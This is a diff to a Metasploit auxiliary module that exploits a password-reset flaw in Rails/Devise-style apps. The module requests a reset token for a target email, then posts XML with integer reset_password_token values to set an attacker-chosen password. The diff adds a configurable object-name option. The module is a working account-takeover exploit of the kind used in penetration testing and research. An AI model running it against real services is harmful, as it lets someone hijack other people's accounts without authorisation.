@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -54,6 +52,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptString.new('TARGETURI', [ true,  'The request URI', '/users/password']),
         OptString.new('TARGETEMAIL', [true, 'The email address of target account']),
+        OptString.new('OBJECTNAME', [true, 'The user object name', 'user']),
         OptString.new('PASSWORD', [true, 'The password to set']),
         OptBool.new('FLUSHTOKENS', [ true, 'Flush existing reset tokens before trying', true]),
         OptInt.new('MAXINT', [true, 'Max integer to try (tokens begining with a higher int will fail)', 10])
@@ -63,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
   def generate_token(account)
     # CSRF token from GET "/users/password/new" isn't actually validated it seems.
 
-    postdata="user[email]=#{account}"
+    postdata="#{datastore['OBJECTNAME']}[email]=#{account}"
 
     res = send_request_cgi({
       'uri'     => normalize_uri(datastore['TARGETURI']),
@@ -102,11 +101,11 @@ class Metasploit3 < Msf::Auxiliary
       encode_pass = REXML::Text.new(password).to_s
 
       xml = ""
-      xml << "<user>"
+      xml << "<#{datastore['OBJECTNAME']}>"
       xml << "<password>#{encode_pass}</password>"
       xml << "<password_confirmation>#{encode_pass}</password_confirmation>"
       xml << "<reset_password_token type=\"integer\">#{int_to_try}</reset_password_token>"
-      xml << "</user>"
+      xml << "</#{datastore['OBJECTNAME']}>"
 
       res = send_request_cgi({
           'uri'     => normalize_uri(datastore['TARGETURI']),
@@ -146,9 +145,10 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     # Clear outstanding reset tokens, helps ensure we hit the intended account.
-    print_status("Clearing existing tokens...")
-    clear_tokens() if datastore['FLUSHTOKENS']
-
+    if datastore['FLUSHTOKENS']
+      print_status("Clearing existing tokens...")
+      clear_tokens()
+    end
     # Generate a token for our account
     print_status("Generating reset token for #{datastore['TARGETEMAIL']}...")
     status = generate_token(datastore['TARGETEMAIL'])
